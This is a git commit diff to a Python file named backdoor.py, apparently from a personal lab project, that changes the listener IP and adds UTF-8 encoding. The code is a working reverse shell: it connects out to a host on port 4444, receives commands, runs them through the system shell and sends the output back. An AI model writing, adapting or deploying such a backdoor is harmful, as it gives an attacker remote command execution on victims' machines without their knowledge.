fc1e9bbce863944e070d4afc28f93ba562d53c49
Ryan Valdriz <ryvaldriz101@gmail.com>
2020-08-23 21:22:47 -0400

    encode & decode utf-8

--- backdoor.py
+++ backdoor.py
@@ -7,12 +7,15 @@ def execute_sys_command(command):
     return subprocess.check_output(command, shell=True)
 
 connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection.connect(("10.0.2.16", 4444))
+connection.connect(("10.0.2.4", 4444))
 
-connection.send(b'\n[+] Connection established. \n')
+# connection.send(b'\n[+] Connection established. \n')
+output = "\n[+] Connection established\n"
+
+connection.sendall(output.encode('utf-8'))
 
 command = connection.recv(1024)
-command_result = execute_sys_command(command)
+command_result = execute_sys_command(command.decode('utf-8'))
 connection.send(command_result)
 
 connection.close()
